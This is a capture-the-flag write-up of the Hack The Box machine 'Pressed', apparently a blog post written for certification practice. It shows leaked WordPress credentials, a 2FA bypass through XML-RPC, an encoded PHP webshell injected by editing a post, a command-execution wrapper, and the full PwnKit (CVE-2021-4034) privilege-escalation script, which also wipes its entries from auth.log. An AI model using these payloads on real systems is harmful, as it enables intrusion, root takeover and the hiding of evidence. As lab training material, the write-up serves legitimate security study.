---
title: "HTB Pressed"
date: 2026-05-19 10:51 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Linux, Hard]
image: /assets/img/posts/pressed/pressed.png
---

**HTB Pressed** is a Linux machine that starts with discovering a `WordPress` backup config file exposing admin credentials, bypassing `2FA` by interacting entirely through `XML-RPC`, decoding a `Base64` payload in an existing post to uncover a `php-everywhere` block, injecting a `PHP` webshell via `XML-RPC` post editing to achieve unauthenticated `RCE` as `www-data`, and escalating to `root` by uploading and executing a `PwnKit` (`CVE-2021-4034`) exploit through the `WordPress` media upload API.

## Reconnaissance

### Scanning

- Nmap (All ports)

```
nmap -p- 10.129.136.28 --min-rate 1000 -nv
```
```
PORT   STATE SERVICE
80/tcp open  http
```

- NSE Scripts & Version

```
nmap -sCV -p80 10.129.136.28 --min-rate 1000 -nv
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
|_http-generator: WordPress 5.9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Configuration

- /etc/hosts

```bash
pressed.htb    10.129.136.28
```

## wpscan

### Normal
```
wpscan --url http://10.129.136.28/ --api-token XXXXXXXXXXXXXXXX
```
```
[+] XML-RPC seems to be enabled: http://10.129.136.28/xmlrpc.php
[i] Config Backup(s) Identified:
[!] http://10.129.136.28/wp-config.php.bak
 | Found By: Direct Access (Aggressive Detection)
```
```
admin:uhc-jan-finals-2021 //2022
```

![otp](/assets/img/posts/pressed/otp.png)

### All plugins

```
wpscan --url http://10.129.136.28/ --api-token XXXXXXXXXXXXXXXXXXXX -e ap --plugins-detection aggressive
```

## XML-RPC

- [XML-RPC-WORDPRESS](https://codex.wordpress.org/XML-RPC_WordPress_API)

### ListMethods

```
curl --data "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

### htb.get_flag

```
curl --data "<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>" http://pressed.htb/xmlrpc.php
```

## Python-XML-RPC

- [Docs](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html)

```
pip install python-wordpress-xmlrpc
```

### GetPosts()

```
(Pressed) ➜  Pressed sed -i 's/collections\.Iterable/collections.abc.Iterable/g' \
  .venv/lib/python3.12/site-packages/wordpress_xmlrpc/base.py
(Pressed) ➜  Pressed grep "Iterable" .venv/lib/python3.12/site-packages/wordpress_xmlrpc/base.py
            elif isinstance(raw_result, collections.abc.Iterable):
(Pressed) ➜  Pressed python3                                                                    
Python 3.12.12 (main, Feb  3 2026, 22:51:04) [Clang 21.1.4 ] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from wordpress_xmlrpc import Client
>>> from wordpress_xmlrpc.methods import posts
>>> client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
>>> plist = client.call(posts.GetPosts())
>>> plist
[<WordPressPost: b'UHC January Finals Under Way'>]
>>> 
```

```
>>> dir(plist[0])
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_def', 'comment_status', 'content', 'custom_fields', 'date', 'date_modified', 'definition', 'excerpt', 'guid', 'id', 'link', 'menu_order', 'mime_type', 'parent_id', 'password', 'ping_status', 'post_format', 'post_status', 'post_type', 'slug', 'sticky', 'struct', 'terms', 'thumbnail', 'title', 'user']
>>> plist[0].user
'1'
>>> plist[0].password
''
>>> plist[0].link
'/index.php/2022/01/28/hello-world/'
```

```
>>> plist[0].content
'<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> 
```
![url](/assets/img/posts/pressed/decode.png)

## php-everywhere plugin

- URL ENCODE + BASE64

![base64](/assets/img/posts/pressed/b64.png)

```
>>> mod_post = plist[0]
>>> mod_post.co
mod_post.comment_status mod_post.content       
>>> mod_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDP3BocCUwQXN5c3RlbSgkX1JFUVVFU1QlNUInY21kJyU1RCk7JTBBPyUzRQ==","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
>>> client.call(posts.EditPost(mod_post.id, mod_post))
True
```

![shell](/assets/img/posts/pressed/shell.png)

```bash
#!/usr/bin/env bash

base='http://pressed.htb/index.php/2022/01/28/hello-world/'

cmd=$1

curl -sG --data-urlencode "cmd=$cmd" "$base" |
awk '
  /Metrics for this event can be found below\.<\/p>/ {capture=1; next}
  /<p><\/p>/ && capture {exit}
  capture
' |
sed -e 's/<[^>]*>//g' \
    -e 's/&#8211;/--/g' \
    -e 's/&#8212;/---/g' |
sed '/^[[:space:]]*$/d'
```

```
./web-exec id
```

## PwnKit

### Exploit

- [Pwnkit - CVE](https://blog.qualys.com/vulnerabilities-thrhttps://github.com/kimusan/pkwner/blob/main/pkwner.sh)

![pwnkit](/assets/img/posts/pressed/pwnkit.png)

```bash
#!/bin/bash
echo "██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ "
echo "██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗"
echo "██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝"
echo "██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗"
echo "██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║"
echo "╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝"
echo "CVE-2021-4034 PoC by Kim Schulz"
# shell poc by Kim Schulz
echo "[+] Setting up environment..."
mkdir -p 'GCONV_PATH=.'
touch 'GCONV_PATH=./pkwner'
chmod a+x 'GCONV_PATH=./pkwner'
mkdir -p pkwner
echo "module UTF-8// PKWNER// pkwner 2" > pkwner/gconv-modules
cat > pkwner/pkwner.c <<- EOM
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
  printf("hello");
  setuid(0); setgid(0);
	seteuid(0); setegid(0);
  system("PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;"
         "rm -rf 'GCONV_PATH=.' 'pkwner';"
         "cat /var/log/auth.log|grep -v pkwner >/tmp/al;cat /tmp/al >/var/log/auth.log;"
         "id");
	exit(0);
}
EOM

cat > pkwner/exec.c <<- EOM
#include <stdlib.h>
#include <unistd.h>
int main(){
  char *env[] = {"pkwner", "PATH=GCONV_PATH=.", "CHARSET=PKWNER",
                 "SHELL=pkwner", NULL};
  execve("/usr/bin/pkexec", (char *[]){NULL}, env);
}
EOM
echo "[+] Build offensive gconv shared module..."
gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c
echo "[+] Build mini executor..."
gcc -o pkwner/executor pkwner/exec.c
# export PATH="GCONV_PATH=."
# export CHARSET="PKWNER"
#export SHELL=pkwner
PATH='GCONV_PATH=.' ./pkwner/executor
echo "[+] Nice Job"
```

### Upload Via Media

```
>>> from wordpress_xmlrpc.methods import media
>>> with open('pkwner.sh', 'r') as f:
...     script = f.read()
>>> data = { 'name': 'pkwner.png', 'bits': script, 'type': 'text/plain' }
>>> client.call(media.UploadFile(data))
```

### RCE as root

![root](/assets/img/posts/pressed/root.png)
